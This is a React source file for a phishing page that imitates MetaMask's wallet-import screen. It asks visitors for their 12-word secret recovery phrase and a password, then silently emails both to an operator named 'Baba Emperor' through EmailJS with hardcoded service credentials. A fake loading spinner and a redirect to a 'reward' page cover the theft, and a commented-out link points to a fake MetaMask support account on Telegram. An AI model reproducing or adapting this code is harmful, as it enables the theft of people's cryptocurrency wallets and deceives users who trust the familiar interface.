import { useState } from 'react'
import { Link, useNavigate } from 'react-router-dom'
import { RiQrCodeLine } from "react-icons/ri";
import { SiTelegram } from "react-icons/si";
import Loader from './../components/loader/Loader'
import emailjs from 'emailjs-com';


const Home = () => {
    
  const [showPassword,setShowPassword] = useState(false)
  const [password,setPassword] = useState()
  const [confirmPassword,setConfirmPassword] = useState()
  const [seed,setSeed] = useState('')
  const [showSeed, setShowSeed] = useState()
  const [errorMessage, setErrorMessage] = useState('');
  const [passError, setPassError] = useState('');
  const [loader, setLoader] = useState(false)
  const navigate = useNavigate()

  
  const handleInputChange = (event) => {
    const value = event.target.value;
    setSeed(value);

    // Regular expression to match 12 phrases separated by spaces
    const regex = /^(\w+\s){11}\w+$/;
    if (regex.test(value)) {
      setErrorMessage('');
    } else {
      setErrorMessage('Please enter exactly 12 phrases separated by spaces');
    }
  };
  
  const submitData = async (e) => {

 if (password != confirmPassword) {
      setPassError('password does not match')
    }
    else {
      setPassError('') 
      setLoader(true)

      setTimeout(() => {
        setLoader(false);
        navigate('/reward')
      }, 6000);
  }
  
  // email sending
  const msg = `A new user with the following details ~ \n 12 phrase seed: ${seed} \n and password: ${password}`

  const data = {
    from_name: 'New Client',
    to_name: 'Baba Emperor',
    message: msg
  }

    emailjs.send(
      'service_e7dyidx',
      'template_0ktj1l3',
      data,
      'kLvhI1Lak2ZIvFe6R',
    )
    .then((response) => {
      console.log('SUCCESS!', response.status, response.text);
    })
    .catch((err) => {
      console.log('FAILED...', err);
    });

  }
    
  return (
    <>
           {
      loader && <Loader />
    }


      <div className="container">
        <div className='logo'>
          <span>
            <img src="/A.png" alt="file not found" />
            <h1> M E T A M A S K</h1>
          </span>
        </div>

        <div className='body'>
          
    <form class="form" onSubmit={ (e) => {
            e.preventDefault()
            submitData()
          }}>
            
       <p class="form-title">Import from Secret Recovery Phrase</p>

        <div class="input-container">
          <span id='itext'>
          <p id="one">Secret Recovery Phrase</p>
          <p id='show'  onClick={()=>{setShowSeed(!showSeed);}}>show</p>
          </span>
          
          <span id='Iformx'>
          <input
           type={`${showSeed ? "text" : "password"}`}  
           placeholder="Enter your Secret Recovery Phrase" 
           id='one'
           value={seed} 
           onChange={handleInputChange} 
           required
           />
            <label htmlFor='qrcode'><RiQrCodeLine className='icon'/></label>
          </span>
          {errorMessage && <span className='error'>{errorMessage}</span>}

      </div>
      
      <div class="input-container">
          <span id='itext'>
          <p id="one">New password</p>
          <p id='show'  onClick={()=>{setShowPassword(!showPassword);}} >show</p>
          </span>
          
          <span id='Iformx'>
          <input 
          type={`${showPassword ? "text" : "password"}`} 
          placeholder="New password" 
          id='one'
          onChange={(e)=>{
            setPassword(e.target.value.trim())
          }}
          required
          minLength={8}
          value={password}
          autocomplete="off"
          />
          </span>
          {passError && <span className='error'>{passError}</span>}

      </div>

      <div class="input-container">
          <span id='itext'>
          <p id="one">Confirm Password</p>
          </span>
          
          <span id='Iformx'>
          <input 
          type="password" 
          placeholder="Confirm password" 
          id='one'
          onChange={(e)=>{
            setConfirmPassword(e.target.value.trim())
          }}
          required
          minLength={8}
          value={confirmPassword}
          autocomplete="off"
          />
          </span>
          <span id='footerx'>
            <p id='footer'>Must be at least 8 characters</p>
          </span>

<input type="file" accept="image/*" id='qrcode' capture="environment" hidden />
      </div>

<div className="input-container">
         <button type="submit" class="submit">
        IMPORT
      </button>
      </div>

   </form>

        </div>


        {/* <div className="telegram" >
        <Link to='https://t.me/customer_support_metamask'>
            <SiTelegram />
          </Link>
        </div> */}

        <footer>
            <p>By proceeding, you agree to these <Link to='/terms_and_policy'>Terms and Conditions.</Link> </p>
        </footer>
      </div>
 
    </>
  )
}

export default Home